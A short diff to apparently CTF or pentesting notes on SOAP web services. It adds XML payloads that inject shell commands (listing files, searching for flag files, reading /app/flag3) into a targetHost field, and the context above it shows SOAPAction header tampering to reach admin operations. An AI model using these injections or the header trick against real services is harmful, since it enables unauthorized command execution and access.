@@ -55,3 +55,24 @@ Add the header :
     SOAPAction: urn:ws-user-account#getAdminInfo
 
 If the request is restricted to only admins, look for the soap action header related to the admin operation.
+
+<br/>
+
+# Command Execution
+
+    <targetHost>
+     ; ls
+    </targetHost>
+
+<br/>
+
+    <targetHost>
+     ; find / -iname *flag*
+    </targetHost>
+
+
+<br/>
+
+    <targetHost>
+     ; cat /app/flag3
+    </targetHost>
